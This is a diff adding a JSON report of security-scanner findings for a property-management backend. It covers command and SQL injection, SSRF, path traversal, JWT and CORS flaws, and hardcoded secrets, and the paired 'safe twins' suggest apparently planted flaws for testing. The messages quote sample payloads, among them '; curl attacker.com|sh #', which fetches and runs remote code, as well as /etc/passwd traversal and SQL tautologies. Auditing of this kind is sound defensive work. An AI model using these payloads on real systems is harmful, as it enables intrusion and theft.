@@ -1,0 +1,530 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.authn.jwt-decode-without-verify",
+      "path": "backend/src/routes/dispatch.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveDispatchBrief() uses app.jwt.decode() instead of app.jwt.verify() to read the dispatch token used by /dispatch/:token, /dispatch/:token/queue, /dispatch/:token/materials-receipt and /dispatch/:token/complete (all outside the /api/ prefix and therefore not covered by the global authenticate onRequest hook in index.ts). jwt.decode() only base64-decodes the payload and never checks the signature, so any attacker can craft an arbitrary '{\"ticketId\":\"...\",\"contractor\":\"...\"}' JWT-shaped string with no valid signature and fully impersonate a dispatch link, reading and modifying any maintenance ticket (including marking it completed) with zero authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.privilege-escalation",
+      "path": "backend/src/routes/notifications.ts",
+      "start": {
+        "line": 89,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 99,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "mergeDeviceSyncSnapshot() (lines 21-23) does Object.assign(user, snapshot) where snapshot is JSON.parse()'d directly from the attacker-controlled 'mobileSyncSnapshot' cookie, then the merged entity is saved. Any authenticated user (even a tenant) can send a cookie like mobileSyncSnapshot={\"role\":\"property_admin\",\"isActive\":true} to POST /api/notifications/device-sync/restore and overwrite arbitrary User columns, including role and passwordHash, achieving full privilege escalation. Contrast with the safe twin applyVerifiedDeviceSyncSnapshot()/'/restore-verified', which validates the payload against a strict zod schema allowing only phone/avatarUrl.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-execsync",
+      "path": "backend/src/routes/messages.ts",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderCorrespondencePacket() builds a shell command via string interpolation: execSync(`pandoc ${sourceMarkdownPath} -o ${outFile} --pdf-engine-opt=${paperProfile}`). paperProfile is taken directly from the attacker-controlled 'x-mailroom-paper-profile' request header at line 259 (route POST /api/messages/notices/:id/print-packet) with no allowlist/escaping, allowing arbitrary OS command injection, e.g. header value '$(reboot)' or '; curl attacker.com|sh #'. Contrast with leases.ts renderRenewalPacket, which validates the profile against ALLOWED_PAPER_PROFILES and uses spawn() with shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-bash-c",
+      "path": "backend/src/routes/importExport.ts",
+      "start": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildMaintenanceReportCommand() interpolates 'preset' directly into a shell command string, which is then executed via spawn('bash', ['-c', cmd], {shell:true, ...}) at line 300 in GET /api/export/maintenance/rendered. 'preset' comes unsanitized from the 'reportPreset' cookie or a query parameter (line 296), with no allowlist (unlike buildInspectionsReportArgs, which validates against ALLOWED_REPORT_TEMPLATES and is invoked with shell:false and an argv array). An attacker can inject shell metacharacters to execute arbitrary commands.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 34,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 37,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "evaluateMoveOutProrationFormula() executes attacker-supplied text as JavaScript via new Function('params', `return (${formula})`). The formula string is taken directly from the 'prorationFormula' multipart field of POST /api/leases/:id/moveout-worksheet (lines 324-344) with no sanitization, restriction, or sandboxing, allowing arbitrary code execution in the Node.js process (e.g. formula = 'require(\"child_process\").execSync(\"...\")').",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-saved-search",
+      "path": "backend/src/routes/units.ts",
+      "start": {
+        "line": 45,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 50,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildSavedSearchFilterClause() builds a raw SQL WHERE clause by string concatenation of both the field name and value: `unit.${field} = '${value}'`, joined and passed straight into qb.andWhere(clause) at line 125 in GET /api/units/saved-search. Both keys and values come from unvalidated req.query criteria (line 120), so a query string like ?status=x' OR '1'='1 or a fake field name lets an attacker inject arbitrary SQL into the generated query.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-ledger-reconciliation",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 34,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 43,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findPaymentsByLedgerCriteria() concatenates both column names and values from the request body directly into a raw SQL string (`\"${field}\" = '${value}'`) and executes it via AppDataSource.query(sql), reachable from POST /api/payments/ledger-reconciliation (lines 150-157) with no validation of the criteria object, unlike the sibling findPaymentsByCustomView which validates with a strict zod schema. This allows full SQL injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-lease-notes",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 98,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 102,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchLeaseNotesByTerm() interpolates the user-supplied 'term' directly into a raw SQL string (`WHERE notes ILIKE '%${term}%'`) run via AppDataSource.query(), reachable from GET /api/leases/notes-search?term=... (lines 182-187) with no parameterization or escaping, allowing SQL injection (e.g. term=%' OR '1'='1).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssrf-import-from-source",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 54,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 59,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "mirrorArchiveSourceFile() performs fetch(sourceUrl) with no host allowlist, and is reachable from POST /api/documents/import-from-source (lines 264-289) for any property_admin/property_manager with an arbitrary attacker-supplied 'sourceUrl' in the request body. This allows SSRF against internal services (e.g. http://169.254.169.254/, internal admin panels), whose response body is written to disk and returned. Contrast with the safe twin mirrorTrustedArchiveSourceFile(), which enforces ALLOWED_ARCHIVE_SOURCE_HOSTS.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection",
+      "path": "backend/src/routes/buildings.ts",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findAmenityMatchesUnsafe() builds an XPath expression by directly interpolating 'amenityName' into the query string (`//amenity[@name='${amenityName}'] | ...`). amenityName is stored from a prior POST /api/buildings/:id/amenities/search-preference call and then used unescaped in GET /api/buildings/:id/amenities/quick-view (lines 114-132), allowing XPath injection (e.g. closing the quote to inject `' or '1'='1`) to bypass the intended filter and extract arbitrary nodes from the amenities XML. The safe twin findAmenityMatchesSafely() correctly escapes the value with escapeXPathString().",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "backend/src/services/directory.ts",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory() builds an LDAP filter by directly interpolating the unescaped 'term' parameter (`(&(objectClass=person)(cn=*${term}*))`), reachable from GET /api/buildings/:id/onsite-staff?name=... (buildings.ts lines 194-205). An attacker-controlled 'name' value containing '*)(|' filter metacharacters can inject arbitrary LDAP filter clauses, bypassing the intended search and potentially disclosing unrelated directory entries. The sibling function queryEmployeeDirectory() correctly escapes filter metacharacters with escapeLdapFilterValue().",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: LDAP Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.moveout-packet-folder",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 78,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 84,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "depositMoveOutPacketInTenantArchive() joins the tenant-controlled profile.moveOutPacketFolder directly into a filesystem path (path.join(TENANT_ARCHIVE_ROOT, profile.userId, profile.moveOutPacketFolder || '.')) with no sanitization. moveOutPacketFolder is settable by any tenant via PATCH /api/users/me/profile (users.ts lines 221-233, no validation) to a value like '../../../etc' and is then used by POST /api/leases/:id/move-out-packet (lines 268-281) to write a file outside the intended tenant archive directory. The safe twin depositMoveOutPacketInTenantArchiveSafely() resolves and checks the path stays under the tenant root.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.records-room-folder",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 41,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 43,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "listRecordsRoomFolder() joins the 'folder' route parameter directly into fs.readdirSync(path.join(RECORDS_ROOM_DIR, folder)) with no sanitization, reachable from GET /api/documents/records-room/:folder (lines 112-120). A value like '../../' allows listing arbitrary directories on the filesystem outside RECORDS_ROOM_DIR. The safe twin listRecordsRoomFolderSafely() applies path.basename() to strip traversal sequences.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.report-template-source",
+      "path": "backend/src/routes/importExport.ts",
+      "start": {
+        "line": 52,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 55,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadReportTemplateSource() joins the unsanitized 'templateName' route param into fs.readFileSync(path.join(REPORT_TEMPLATE_DIR, templateName)), reachable from GET /api/export/report-templates/:templateName/source (lines 325-334). A value like '../../../etc/passwd' reads arbitrary files on disk. The safe twin loadReportTemplateSourceSafely() resolves the path and verifies it stays within REPORT_TEMPLATE_DIR.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.dispatch-return-url",
+      "path": "backend/src/routes/dispatch.ts",
+      "start": {
+        "line": 26,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveDispatchReturnDestination() returns the raw 'x-return-url' request header value with no allowlist/validation, and reply.redirect(destination) is called with it at line 130 in POST /dispatch/:token/complete. An attacker (who, per the jwt.decode finding above, doesn't even need a valid token) can set x-return-url to an external URL to redirect victims to a phishing site. Contrast with tickets.ts resolveTenantConfirmationDestination(), which restricts the destination to ALLOWED_TENANT_CONFIRMATION_DESTINATIONS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.permissive-cors-with-credentials",
+      "path": "backend/src/index.ts",
+      "start": {
+        "line": 41,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "app.register(cors, { origin: true, credentials: true }) reflects any request Origin back in Access-Control-Allow-Origin while also allowing credentials (cookies) to be sent cross-origin. Combined with the auth-carrying cookies issued elsewhere in the app (staffDeviceSession, portalKioskSession, browsingSessionId), any malicious website can make credentialed cross-origin requests to this API and read the JSON responses, defeating the same-origin policy.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.missing-httponly-secure-auth-cookie",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 31,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 33,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openKioskPortalSession() sets the 'portalKioskSession' cookie carrying a signed 12h JWT (see /api/auth/kiosk-checkin, lines 96-106) with no HttpOnly, Secure, or SameSite attributes, unlike openStaffDeviceSession() (lines 35-39) which sets HttpOnly, SameSite=Strict and Secure-in-production for an equivalent auth cookie. The kiosk session token is readable by any JavaScript on the page (XSS-exfiltrable) and sent over plain HTTP and cross-site requests.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.log-injection.search-activity",
+      "path": "backend/src/services/activityLog.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordSearchActivity() writes the raw, unsanitized user-supplied query directly into a log line via console.log, reachable from GET /api/tickets/descriptions-search?term=... (tickets.ts line 190). An attacker can embed newline/control characters in 'term' to inject forged log entries or corrupt log parsing. The safe twin recordSearchActivitySafely() strips \\r\\n\\0 before logging.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.client-trusted-priority-boost",
+      "path": "backend/src/routes/tickets.ts",
+      "start": {
+        "line": 47,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePriorityBoostFromClientClaim() grants a 'high' priority boost purely based on a client-supplied 'serviceLevel' field in the request body (POST /api/tickets/:id/priority-boost, lines 330-345), with no server-side verification of the tenant's actual plan. Any tenant can send {serviceLevel:'premium'} to jump their own maintenance ticket queue position. Contrast with resolvePriorityBoostFromLeaseRecord()/'-verified', which derives the entitlement from the tenant's actual lease/autopay record.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-807: Reliance on Untrusted Inputs in a Security Decision"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credential.jwt-secret-fallback",
+      "path": "backend/src/index.ts",
+      "start": {
+        "line": 42,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 42,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to the hardcoded literal 'dev-jwt-secret' when process.env.JWT_SECRET is unset. If this fallback is ever active in a deployed environment, an attacker who knows/guesses this well-known default can forge valid authentication tokens for any user/role.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credential.rent-bureau-key-fallback",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 46,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 46,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "reportPaymentToRentBureau() falls back to a hardcoded, realistic-looking API key literal ('rb_live_9f3ac2b8e7d1a04c') when process.env.RENT_BUREAU_KEY is unset, embedding a live-looking credential directly in source code.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
